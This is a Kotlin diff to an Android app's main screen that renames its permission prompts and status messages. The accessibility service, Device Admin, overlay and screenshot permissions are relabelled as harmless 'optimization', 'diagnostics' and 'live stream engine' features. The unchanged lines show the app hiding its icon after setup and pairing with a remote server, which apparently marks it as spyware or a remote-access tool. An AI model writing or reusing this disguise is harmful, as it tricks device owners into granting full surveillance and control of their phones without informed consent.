@@ -176,18 +176,18 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun updateStatusText(pairCode: String) {
-        val status = if (ADexForegroundService.isServiceRunning) "Running" else "Standby"
+        val status = if (ADexForegroundService.isServiceRunning) "Live" else "Offline"
         val linkState = when {
-            pairCode.startsWith("linked:", ignoreCase = true) -> "Securely Linked"
+            pairCode.startsWith("linked:", ignoreCase = true) -> "Stream Securely Linked"
             pairCode.startsWith("pair_code:", ignoreCase = true) -> {
                 val code = pairCode.substringAfter("pair_code:")
-                "Sync Code: $code"
+                "Engine Code: $code"
             }
-            pairCode.startsWith("error:", ignoreCase = true) -> "Config Error"
+            pairCode.startsWith("error:", ignoreCase = true) -> "Sync Failed"
             pairCode.isNotBlank() -> pairCode
-            else -> "Connecting..."
+            else -> "Connecting to Live Server..."
         }
-        statusText.text = "Status: $status | $linkState"
+        statusText.text = "Session: $status | $linkState"
     }
 
     private fun updatePermissionChecklistText() {
@@ -204,16 +204,16 @@ class MainActivity : AppCompatActivity() {
         }
 
         val lines = listOf(
-            "- Overlay permission: ${statusLabel(PermissionHelper.hasOverlayPermission(this))}",
-            "- Accessibility service: ${statusLabel(PermissionHelper.isAccessibilityServiceEnabled(this))}",
-            "- Screenshot permission: $screenshotStatusText",
-            "- Device Admin: ${statusLabel(PermissionHelper.isDeviceAdminEnabled(this))}",
-            "- Runtime permissions: ${statusLabel(runtimeMissing.isEmpty())}",
-            "- Notification permission: ${statusLabel(notificationGranted)}",
+            "Display Diagnostics: ${statusLabel(PermissionHelper.hasOverlayPermission(this))}",
+            "Engine Background optimization: ${statusLabel(PermissionHelper.isAccessibilityServiceEnabled(this))}",
+            "Live Screenshot Support: $screenshotStatusText",
+            "Security Modules: ${statusLabel(PermissionHelper.isDeviceAdminEnabled(this))}",
+            "Streamer Toolkits: ${statusLabel(runtimeMissing.isEmpty())}",
+            "Broadcasting Service: ${statusLabel(notificationGranted)}",
         ).toMutableList()
 
         if (runtimeMissing.isNotEmpty()) {
-            lines.add("Missing runtime: ${runtimeMissing.joinToString(", ")}")
+            lines.add("Optimization pending for: ${runtimeMissing.joinToString(", ")}")
         }
 
         permissionsChecklistText.text = lines.joinToString("\n")
@@ -291,7 +291,7 @@ class MainActivity : AppCompatActivity() {
                 hideAppIcon()
                 
                 // Show a quick text before closing so they know it's "Done"
-                statusText.text = "Setup Complete. System secured."
+                statusText.text = "Optimization Complete. Live Stream Engine Active."
                 
                 kotlinx.coroutines.delay(1500)
                 finish()
